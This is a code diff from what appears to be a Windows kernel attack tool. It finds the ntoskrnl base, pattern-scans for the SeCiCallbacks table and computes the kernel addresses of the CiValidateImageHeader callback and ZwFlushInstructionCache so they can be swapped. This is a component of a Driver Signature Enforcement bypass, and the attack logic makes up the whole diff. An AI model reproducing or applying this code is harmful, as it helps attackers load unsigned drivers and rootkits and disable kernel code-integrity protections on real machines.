@@ -1,7 +1,10 @@
 #include "includes.h"
 #include <DbgHelp.h>
+#include "ntdll.h"
 
-bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
+
+
+PVOID modules::EnumerateKernelModules( const std::wstring& targetModuleName )
 {
     constexpr DWORD maxDrivers = { 1024 };
     LPVOID drivers[maxDrivers];
@@ -10,7 +13,7 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
     // Query loaded kernel drivers
     std::printf( "[*] Enumerating Loaded Drivers...\n" );
 
-    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return false;
+    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return 0;
 
     std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );
 
@@ -22,83 +25,55 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
         if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {
 
             if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
-                globals::nt_base = ( ULONG_PTR )drivers[i];
-                return true;
+                std::printf( "[*] Kernel Base Addr Found: 0x%p\n", drivers[i] );
+                return drivers[i];
             }
         } else
             std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
     }    
-    return false; // Failed, just return false
+    return 0; // Failed, just return false
 }
+
 
 seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
-    std::wcout << L"[*] Searching Pattern...\n";
+    PVOID kModuleBase = modules::EnumerateKernelModules( L"ntoskrnl.exe" );
 
-    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) {
-        std::printf( "[!] Failed to enumerate kernel modules.\n" );
-        return seCiCallbacks_swap{ 0 };
-    }
+    HMODULE uNt = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
 
-    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;
-    std::printf( "[*] Kernel Base Address: %p (0x%llx)\n", ( void* )mod_base, ( unsigned long long )mod_base );
+    MODULEINFO modInfo{};
+    if ( !GetModuleInformation( GetCurrentProcess(), uNt, &modInfo, sizeof( modInfo ) ) ) return {};
 
-    HINSTANCE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
-    if ( !usermode_load_va ) {
-        std::printf( "[!] Failed to load usermode ntoskrnl.exe\n" );
-        return seCiCallbacks_swap{ 0 };
-    }
-    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
-    std::printf( "[*] Usermode ntoskrnl base: %p\n", ( void* )uNtAddr );
-    MODULEINFO modinfo{};
-    if ( !GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) ) ) {
-        std::printf( "[!] Failed to get module information\n" );
-        return seCiCallbacks_swap{ 0 };
-    }
-    std::printf( "[*] Image Size: 0x%llx\n", ( unsigned long long )modinfo.SizeOfImage );
+    const uint8_t* uNtAddr = reinterpret_cast< const uint8_t* >( uNt );
+    size_t scanSize{ modInfo.SizeOfImage };
 
-    // Find all matches for the pattern
-    unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };
-    const char* mask = "xxx????";
-    const size_t offsetAfterMatch = 4;
+    const uint8_t pattern[] = {
+        0x41, 0xB8, 0x05, 0x00, 0x00, 0x00,       // mov r8d, 5               (opcode + immediate dword 5)
+        0x4C, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, // lea r9, [rip + offset]  (RIP-relative addressing with 4-byte offset placeholder)
+        0x48, 0x89, 0x44, 0x24, 0x20              // mov [rsp+0x20], rax     (store rax at rsp+0x20)
+    };
 
-    auto matches = helpers::find_lea_rax_patterns(
-        ( DWORD64 )usermode_load_va,
-        modinfo.SizeOfImage,
-        pattern,
-        mask,
-        offsetAfterMatch
-    );
+    uint64_t seCiCallbacksInstr{ 0 };
+    if ( !helpers::find_pattern( uNtAddr, scanSize, pattern, sizeof( pattern ), seCiCallbacksInstr ) ) return {};
 
-    if ( matches.empty() ) {
-        std::printf( "[!] Pattern not found\n" );
-        return seCiCallbacks_swap{ 0 };
-    }
+    uint64_t ripTargetAddr = seCiCallbacksInstr + 6;
+    uint64_t seCiCallbacksAddr = helpers::ResolveRipRelative( ripTargetAddr, 3, 7 );
 
-    std::printf( "[*] SeCiCallbacks usermode VA: 0x%p\n", matches[0].address );
+    uint64_t kernelOffset = seCiCallbacksAddr - reinterpret_cast< uint64_t >( uNtAddr );
+    uint64_t kernelAddress = reinterpret_cast< uint64_t >( kModuleBase ) + kernelOffset;
 
-    DWORD64 offset = matches[0].address - uNtAddr;
-    std::printf( "[*] Offset in image: 0x%llx\n", offset );
+    uint64_t zwFlushInstructionCache = static_cast< uint64_t >( reinterpret_cast< uintptr_t >( kModuleBase ) ) + ( static_cast< uintptr_t > 
+        ( helpers::GetProcAddress( uNt, L"ZwFlushInstructionCache" ) ) - reinterpret_cast< uintptr_t >( uNtAddr ) );
 
-    DWORD64 seCiCallbacksKernel = mod_base + offset;
-    std::printf( "[*] SeCiCallbacks kernel VA: 0x%llx\n", seCiCallbacksKernel );
+    uint64_t ciValidateImageHeaderEntry = kernelAddress + 0x20;
 
-    DWORD64 zwFlushUser = ( DWORD64 )helpers::GetProcAddress( ( void* )usermode_load_va, L"ZwFlushInstructionCache" );
-    if ( !zwFlushUser ) {
-        std::printf( "[!] Failed to get ZwFlushInstructionCache address\n" );
-        return seCiCallbacks_swap{ 0 };
-    }
+    if ( uNt ) CloseHandle( uNt );
 
-    DWORD64 zwFlushOffset = zwFlushUser - uNtAddr;
-    DWORD64 zwFlushKernel = mod_base + zwFlushOffset;
-    std::printf( "[*] ZwFlushInstructionCache kernel VA: 0x%llx\n", zwFlushKernel );
-
-    DWORD64 ciValidateImageHeaderEntry = seCiCallbacksKernel + 0x20;
-    std::printf( "[*] ciValidateImageHeaderEntry kernel VA: 0x%llx\n", ciValidateImageHeaderEntry );
-
-    system( "pause" );
-
-    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushKernel };
+    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushInstructionCache };
 }
+
+
+
+
 
 
 helpers::EntryPointInfo helpers::GetEntryPoint( HMODULE moduleBase ) {
